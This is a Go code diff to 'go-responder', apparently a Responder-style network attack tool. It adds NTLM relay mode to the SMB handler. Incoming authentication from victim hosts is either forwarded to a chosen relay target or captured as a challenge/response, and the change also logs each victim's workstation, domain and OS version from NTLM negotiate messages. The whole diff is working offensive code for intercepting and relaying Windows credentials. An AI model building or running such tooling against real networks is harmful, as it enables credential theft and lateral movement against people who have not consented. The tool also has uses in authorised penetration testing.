@@ -9,7 +9,9 @@ import (
 	"net"
 	"time"
 
+	"go-responder/internal/analyzer"
 	"go-responder/internal/core"
+	"go-responder/internal/relay"
 )
 
 var (
@@ -48,8 +50,37 @@ func ServeSMB(ip net.IP) {
 	}
 }
 
+// pickRelayTarget returns the best available relay target for an incoming
+// connection from srcIP, or nil when no relay target is available.
+func pickRelayTarget(srcIP net.IP) net.IP {
+	if len(relay.FixedTargets) > 0 {
+		for _, t := range relay.FixedTargets {
+			if !t.Equal(srcIP) {
+				return t
+			}
+		}
+	}
+	return analyzer.Global.BestRelayTarget(srcIP)
+}
+
 func HandleSMB(conn net.Conn) {
 	defer conn.Close()
+
+	var srcIP net.IP
+	if tcpAddr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
+		srcIP = tcpAddr.IP
+	}
+
+	// If relay mode is on and a target is available, hand the connection off
+	// to the relay engine instead of doing a normal capture.
+	if core.RelayMode {
+		if target := pickRelayTarget(srcIP); target != nil {
+			relay.HandleRelay(conn, target)
+			return
+		}
+		core.LogVerbose("[Relay] no relay target available for %s — falling back to capture", srcIP)
+	}
+
 	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
 	challenge := core.GetChallenge()
@@ -96,6 +127,8 @@ func HandleSMB(conn net.Conn) {
 				}
 				switch core.NTLMMsgType(ntlm) {
 				case 1:
+					ws, dom, osVer := core.ParseNTLMNegotiate(ntlm)
+					analyzer.Global.RegisterNTLMNegotiate(srcIP, ws, dom, osVer)
 					ntlmChal := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
 					spnego := core.WrapSPNEGOChallenge(ntlmChal)
 					challengeIssued = true
@@ -141,6 +174,8 @@ func HandleSMB(conn net.Conn) {
 				}
 				switch core.NTLMMsgType(ntlm) {
 				case 1:
+					ws, dom, osVer := core.ParseNTLMNegotiate(ntlm)
+					analyzer.Global.RegisterNTLMNegotiate(srcIP, ws, dom, osVer)
 					challengeIssued = true
 					sendNB(conn, smb2SessionSetupChallenge(msgID, challenge))
 				case 3:
